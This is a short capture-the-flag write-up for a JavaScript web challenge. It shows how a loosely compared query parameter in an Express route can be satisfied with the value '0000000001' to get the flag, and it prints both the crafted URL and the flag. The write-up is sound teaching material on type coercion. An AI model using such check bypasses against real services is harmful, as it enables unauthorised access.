# QuirkyScript 2
Web

## Challenge 
> Get the flag.

> http://ctf.pwn.sg:8082

> Creator - quanyang (@quanyang)

> [challenge.js](challenge.js)

## Solution

Javascript code

	var flag=require("./flag.js");
	var express=require('express')
	var app=express()
	app.get('/flag',function(req,res){
		if(req.query.second){
			if(req.query.second != "1" && req.query.second.length==10 && req.query.second==true){
				res.send(flag.flag);
				return;
			}
		}
		res.send("Try to solve this.");
	});
	app.listen(31337)

Testing my input of javascript weak comparisons.

	'1' == true
	true

	'11' == true
	false

	'01' == true
	true

	'0000000001' == true
	true

	'0000000001'.length
	10

Final URL

	http://ctf.pwn.sg:8082/flag?second=0000000001

## Flag

	CrossCTF{M4ny_w4ys_t0_mak3_4_numb3r}
